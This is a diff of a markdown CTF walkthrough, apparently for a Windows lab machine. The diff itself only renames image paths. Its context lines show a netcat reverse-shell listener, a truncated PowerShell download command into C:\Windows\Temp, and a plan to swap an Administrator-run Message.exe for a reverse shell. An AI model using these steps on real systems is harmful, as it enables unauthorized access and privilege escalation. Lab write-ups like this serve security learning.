@@ -54,13 +54,13 @@ rlwrap nc -lvnp 4445
 
 Upload the file
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
 
 Navigate to the link and the nc listener should have caught it
 
-<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
@@ -94,7 +94,7 @@ cd C:\Windows\Temp powershell "(New-Object System.Net.WebClient).Downloadfile('h
 
 **What is the OS version of this windows machine?**
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Further enumerate the machine. What is the name of the abnormal **_**service**_** running?**
 
@@ -139,7 +139,7 @@ type 20198415519.INI_LOG.txt
 
 We can see Message.exe is kept being ran by Administrator so we just need to replace the file with our reverse shell, setup a listener and wait for the Administrator to try to run it.
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption><p>Message.exe is called by Administrator </p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (3).png" alt=""><figcaption><p>Message.exe is called by Administrator </p></figcaption></figure>
 
 
 
